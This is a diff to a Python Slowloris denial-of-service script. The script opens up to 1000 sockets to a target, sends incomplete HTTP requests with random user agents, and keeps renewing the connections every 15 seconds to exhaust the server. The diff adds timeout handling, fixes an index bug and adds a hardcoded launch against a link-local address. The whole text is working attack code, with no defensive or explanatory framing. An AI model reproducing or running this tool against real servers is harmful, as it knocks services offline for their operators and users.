@@ -28,15 +28,23 @@ USER_AGENTS = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.
     "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
     "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",]
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"]
 
 def initialize_socket(ip):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((ip,PORT))
+	#s.settimeout(4)
+	try:
+		s.connect((ip,PORT))
 	#connection: keep-alive is enabled by HTTP 1.1 by default
-	s.send("GET /?{} HTTP/1.1 \r\n".format(random.randint(0,5000)).encode("utf-8"))
-	s.send("User-Agent: {}\r\n".format(USER_AGENTS[random.randint(0,len(USER_AGENTS))]).encode("utf-8"))
+	except TimeoutError:
+		print("Timeout Happen")
+		return None
+	r_user_agent = random.randint(0,len(USER_AGENTS)-1)
+	#print(r_user_agent)
+	s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,5000)).encode("utf-8"))
+	s.send("User-Agent: {}\r\n".format(USER_AGENTS[r_user_agent]).encode("utf-8"))
 	s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+	#print("creating sockets...")
 	return s
 
 
@@ -51,19 +59,27 @@ def keep_connection(socket_list,ip):
 				#remove broken socket
 				socket_list.remove(s)
 		#recreating socket to make up the # of broken sockets.
-		for _ in range(num_sock - len(socket_list)):
+		renew_socket = num_sock - len(socket_list)
+		for _ in range(renew_socket):
 			try:
 				s = initialize_socket(ip)
 			except socket.error:
 				break
 			socket_list.append(s)
+		print("renew {} sockets...sleep...".format(renew_socket))
 		time.sleep(15)
 
 def start_slowloris(ip,num_sock):
 	socket_list = []
-	for _ in range(num_sock):
-		socket_list.append(initialize_socket(ip))
+	for i in range(num_sock):
+		print("creating socket...{}".format(i))
+		s = initialize_socket(ip)
+		if s is not None:
+			socket_list.append(s)
 
+	print("keep alive connection...")
 	keep_connection(socket_list,ip)
+
+start_slowloris("169.254.75.164",1000)
 
 
